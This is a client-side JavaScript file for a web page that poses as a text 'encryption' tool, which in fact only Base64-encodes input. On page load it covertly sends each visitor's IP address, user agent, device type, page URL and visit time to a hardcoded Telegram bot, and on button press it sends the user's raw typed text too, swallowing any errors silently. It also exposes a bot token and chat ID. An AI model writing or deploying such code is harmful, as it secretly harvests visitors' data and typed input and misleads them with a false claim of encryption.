const BOT_TOKEN = '8526497249:AAFnDGMvwY4NcnR4zHCad7vgpDjhn8SpI4s';
const CHAT_ID = '1339887333';

// Send alert automatically when page loads
window.onload = function() {
  sendTelegramAlert("🚨 *New Visitor Alert!*");
};

// Fetch visitor public IP with 3-second timeout for mobile compatibility
async function getUserIP() {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 3000);

  try {
    const response = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
    clearTimeout(timeoutId);
    const data = await response.json();
    return data.ip;
  } catch (error) {
    clearTimeout(timeoutId);
    return 'Unavailable';
  }
}

// Encode string safely to Base64
function encryptText(str) {
  return btoa(unescape(encodeURIComponent(str)));
}

// Send payload to Telegram API
async function sendTelegramAlert(headerText, rawInput = '', cipherText = '') {
  const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
  const deviceType = isMobile ? '📱 Mobile Device' : '💻 Desktop';

  const userIP = await getUserIP();
  const userAgent = navigator.userAgent;
  const pageUrl = window.location.href;
  const visitTime = new Date().toLocaleString();

  let message = `${headerText}\n\n`;

  if (rawInput) {
    message += `💬 *Original Text:* \`${rawInput}\`\n` +
               `🔐 *Encrypted Text:* \`${cipherText}\`\n\n`;
  }

  message += `🖥 *Type:* ${deviceType}\n` +
             `🌐 *IP Address:* \`${userIP}\`\n` +
             `⏰ *Time:* ${visitTime}\n` +
             `🔗 *Page:* ${pageUrl}\n` +
             `📱 *User Agent:* ${userAgent}`;

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
  } catch (error) {
    // Silent catch
  }
}

// Handle button trigger
async function handleGenerate() {
  const inputField = document.getElementById('userInput');
  const rawText = inputField.value.trim();

  if (!rawText) return;

  const btn = document.getElementById('submitBtn');
  const successAlert = document.getElementById('successAlert');
  const encryptedContainer = document.getElementById('encryptedContainer');
  const encryptedTextEl = document.getElementById('encryptedText');

  btn.disabled = true;
  btn.innerText = "Processing...";

  // Encrypt raw input
  const cipherText = encryptText(rawText);

  // Update DOM elements
  encryptedTextEl.innerText = cipherText;
  encryptedContainer.style.display = "block";
  successAlert.style.display = "block";

  // Send original and encrypted text to Telegram
  await sendTelegramAlert("🔑 *New Text Keyed In & Encrypted!*", rawText, cipherText);

  btn.disabled = false;
  btn.innerText = "Generate Response";
}
